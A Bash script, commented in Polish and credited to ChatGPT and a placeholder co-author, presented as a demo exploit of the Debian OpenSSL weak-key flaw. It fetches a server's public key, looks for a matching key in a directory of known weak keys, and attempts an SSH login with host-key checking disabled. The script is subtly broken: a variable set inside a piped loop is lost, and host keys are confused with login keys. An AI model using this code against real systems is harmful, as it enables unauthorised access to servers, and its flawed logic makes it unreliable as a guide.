#!/bin/bash
# ================================
# Debian OpenSSL RNG Exploit Demo
# Autor: ChatGPT & <Twoje Imię>
# Styl: hacker-ish, z licznikiem i obsługą błędów
# ================================

TARGET_IP=$1
USER=${2:-root}
KEYS_DIR=${3:-/path/to/debian-ssh}

# Kolory
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# Sprawdzenie argumentów
if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}[!] Użycie: $0 <IP> [user] [keys_dir]${RESET}"
    echo -e "    Przykład: $0 192.168.56.101 msfadmin /usr/share/debian-ssh"
    exit 1
fi

# Sprawdzenie, czy katalog istnieje
if [ ! -d "$KEYS_DIR" ]; then
    echo -e "${RED}[!] Katalog z kluczami nie istnieje: $KEYS_DIR${RESET}"
    exit 1
fi

echo -e "${BLUE}[*] Cel ataku: $TARGET_IP (user: $USER)${RESET}"

# 1. Pobranie klucza publicznego z serwera
echo -e "${YELLOW}[+] Pobieram klucz publiczny serwera...${RESET}"
ssh-keyscan -t rsa $TARGET_IP 2>/dev/null > target.pub
if [ ! -s target.pub ]; then
    echo -e "${RED}[!] Nie udało się pobrać klucza publicznego z $TARGET_IP${RESET}"
    exit 1
fi

# 2. Fingerprint celu
FINGERPRINT=$(ssh-keygen -lf target.pub | awk '{print $2}')
echo -e "${GREEN}[+] Fingerprint serwera: $FINGERPRINT${RESET}"

# 3. Szukanie pasującego klucza w repo z licznikiem
echo -e "${YELLOW}[+] Szukam w repozytorium podatnych kluczy...${RESET}"

COUNT=0
MATCH_FILE=""

# Bezpieczna pętla obsługująca wszystkie nazwy plików
find "$KEYS_DIR" -type f ! -name "*.pub" -print0 | while IFS= read -r -d '' key; do
    ((COUNT++))
    echo -ne "${BLUE}[*] Sprawdzam klucz $COUNT: $key\r${RESET}"

    # Próba wygenerowania fingerprintu, pomijamy błędy
    KEY_FINGERPRINT=$(ssh-keygen -lf "$key" 2>/dev/null | awk '{print $2}')
    if [ "$KEY_FINGERPRINT" == "$FINGERPRINT" ]; then
        MATCH_FILE=$key
        echo -e "\n${GREEN}[+] Znaleziono pasujący klucz prywatny: $MATCH_FILE${RESET}"
        break
    fi
done

# Sprawdzenie, czy znaleziono klucz
if [ -z "$MATCH_FILE" ]; then
    echo -e "\n${RED}[!] Nie znaleziono pasującego klucza w $KEYS_DIR${RESET}"
    exit 1
fi

# 4. Ustawienie praw do klucza
chmod 600 "$MATCH_FILE"

# 5. Próba logowania
echo -e "${YELLOW}[+] Próba logowania na $USER@$TARGET_IP...${RESET}"
ssh -i "$MATCH_FILE" -o StrictHostKeyChecking=no -o BatchMode=yes $USER@$TARGET_IP \
    "echo -e '${GREEN}[*] UDAŁO SIĘ! Masz dostęp do serwera jako $USER 🎉${RESET}'; whoami; uname -a"
